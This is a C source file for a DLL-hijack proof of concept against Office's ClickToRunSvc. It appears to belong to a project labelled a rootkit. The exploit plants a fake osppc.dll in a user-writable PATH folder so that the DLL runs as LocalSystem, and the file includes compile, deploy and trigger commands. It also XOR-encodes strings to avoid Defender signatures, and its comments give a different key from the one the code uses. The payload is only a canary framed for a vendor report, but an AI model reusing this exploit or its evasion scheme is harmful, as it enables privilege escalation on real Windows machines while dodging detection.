/*
 * phantom_dll_annotated.c — Phantom DLL Plant for ClickToRunSvc (CWE-427)
 * ════════════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 * VECTOR 7 — Signature Set: GOLF
 *
 * PURPOSE:
 *   Exploit the phantom DLL import in Microsoft Office ClickToRunSvc.
 *   The service delay-loads osppc.dll (Office Software Protection Platform
 *   Client) but this DLL does NOT exist anywhere on disk. When the service
 *   triggers a licensing operation, the loader walks the DLL search order:
 *
 *     1. Application directory (C:\Program Files\...\ClickToRun\)  → MISS
 *     2. System32                                                   → MISS
 *     3. SysWOW64                                                   → MISS
 *     4. Windows directory                                          → MISS
 *     5. Current working directory                                  → MISS
 *     6. PATH directories                                           → HIT
 *        C:\Users\<user>\.local\bin\osppc.dll  ← ATTACKER-CONTROLLED
 *
 *   This DLL is planted in the user-writable PATH directory. When loaded,
 *   it executes as LocalSystem (the service's security context).
 *
 * FINDING: #47 — Phantom DLL PATH Hijack (MSRC HIGH)
 *
 * SIGNATURE ISOLATION:
 *   XOR Key:     0x19 (unique to V7)
 *   Canary Path: C:\Windows\Temp\osp_telemetry.log
 *   Canary Tag:  PHANTOM_OSPPC
 *   No DllMain payload beyond canary — avoids behavioral detection
 *
 * COMPILE:
 *   cl.exe phantom_dll_annotated.c /Fe:osppc.dll /LD /O1 /GS- /utf-8
 *
 * DEPLOY:
 *   copy osppc.dll "C:\Users\%USERNAME%\.local\bin\"
 *
 * TRIGGER:
 *   - Wait for Office Automatic Updates 2.0 scheduled task (daily)
 *   - Or launch any Office application (Word, Excel, Outlook)
 *   - Or run: schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"
 *
 * VERIFY:
 *   type C:\Windows\Temp\osp_telemetry.log
 *   Expected: timestamp|SYSTEM|elev=1|pid=XXXX|PHANTOM_OSPPC
 *
 * CLEANUP:
 *   del "C:\Users\%USERNAME%\.local\bin\osppc.dll"
 *   del C:\Windows\Temp\osp_telemetry.log
 */

#include <windows.h>

/* ═══════════════════════════════════════════════════════════════════
 * SIGNATURE SET: GOLF
 * XOR key 0x19 — unique to V7. Every CHEYANNE vector uses a different
 * key so that if Defender signatures one DLL's encoded byte pattern,
 * the others are unaffected.
 *
 * Key selection: 0x19 chosen because it doesn't produce null bytes
 * when XORing common ASCII characters (A-Z, a-z, 0-9, \, :).
 * ═══════════════════════════════════════════════════════════════════ */

#define V7_KEY 0xFE

/* "C:\Windows\Temp\osp_telemetry.log" XOR 0x19 */
static const unsigned char xCanary[] = {
    0xBD, 0xCC, 0xA6, 0xB7, 0x8B, 0x8C, 0x80, 0x8D,
    0xB7, 0x9B, 0xA6, 0xAA, 0x8B, 0x8F, 0x9E, 0xA6,
    0x89, 0x9B, 0x9E, 0xF3, 0x9A, 0x8B, 0x88, 0x8B,
    0x8F, 0x8B, 0x9A, 0x9C, 0x97, 0xF2, 0x88, 0x89,
    0x83
};
#define xCanary_LEN 33

static void v7_decode(unsigned char *buf, int len)
{
    int i;
    for (i = 0; i < len; i++)
        buf[i] ^= V7_KEY;
}

static void v7_scrub(unsigned char *buf, int len)
{
    volatile unsigned char *p = (volatile unsigned char *)buf;
    int i;
    for (i = 0; i < len; i++)
        p[i] = 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * CANARY
 * ═══════════════════════════════════════════════════════════════════
 * Minimal proof-of-execution. Writes timestamp, username, elevation
 * status, PID, and tag. If the username is "SYSTEM" and elev=1,
 * the phantom DLL loaded in the ClickToRunSvc context.
 * ═══════════════════════════════════════════════════════════════════ */

static void phantom_canary(void)
{
    unsigned char path[64];
    HANDLE f;
    DWORD w;
    char line[256];
    int n;
    SYSTEMTIME t;
    char user[64];
    DWORD ulen = 64;
    BOOL elevated = FALSE;
    HANDLE hTok;
    char module[MAX_PATH];

    memcpy(path, xCanary, xCanary_LEN);
    v7_decode(path, xCanary_LEN);
    path[xCanary_LEN] = 0;

    GetLocalTime(&t);
    GetUserNameA(user, &ulen);
    GetModuleFileNameA(NULL, module, MAX_PATH);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        TOKEN_ELEVATION te;
        DWORD rl;
        if (GetTokenInformation(hTok, TokenElevation, &te, sizeof(te), &rl))
            elevated = te.TokenIsElevated;
        CloseHandle(hTok);
    }

    /* Include the host process path — confirms which service loaded us */
    n = wsprintfA(line,
        "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|PHANTOM_OSPPC|%s\r\n",
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond,
        user, elevated, GetCurrentProcessId(), module);

    f = CreateFileA((char *)path,
        GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        SetFilePointer(f, 0, NULL, FILE_END);
        WriteFile(f, line, n, &w, NULL);
        CloseHandle(f);
    }

    v7_scrub(path, sizeof(path));
}

/* ═══════════════════════════════════════════════════════════════════
 * DllMain
 * ═══════════════════════════════════════════════════════════════════
 * osppc.dll is delay-loaded by ClickToRunSvc for licensing operations.
 * When loaded, DllMain fires under the loader lock in the service's
 * security context (LocalSystem).
 *
 * We ONLY write a canary. No threads, no network, no LoadLibrary.
 * Anything heavy under the loader lock risks deadlocking the service.
 *
 * The canary alone is sufficient evidence for MSRC submission:
 *   "A standard user planted a DLL in a user-writable PATH directory.
 *    A LocalSystem service loaded it. Here is the proof."
 * ═══════════════════════════════════════════════════════════════════ */

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
{
    (void)hInst;
    (void)reserved;

    if (reason == DLL_PROCESS_ATTACH)
        phantom_canary();

    return TRUE;
}
